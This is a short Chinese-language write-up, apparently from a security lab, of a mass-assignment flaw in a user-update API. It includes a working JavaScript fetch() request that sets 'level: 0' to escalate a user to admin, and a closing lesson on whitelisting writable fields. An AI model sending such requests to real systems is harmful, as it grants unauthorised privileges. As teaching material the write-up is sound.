## 漏洞：Mass Assignment

PUT `/vulnerabilities/api/v2/user/2` 接受 JSON body 直接更新用户。请求里多传 `level:0` → 提权 admin。

## 利用

```javascript
fetch('/vulnerabilities/api/v2/user/2', {
    method: 'PUT',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({name: 'hacker', level: 0})
})
```

## 教训

用户可写的字段必须白名单——不能信任客户端传来的所有 JSON key。
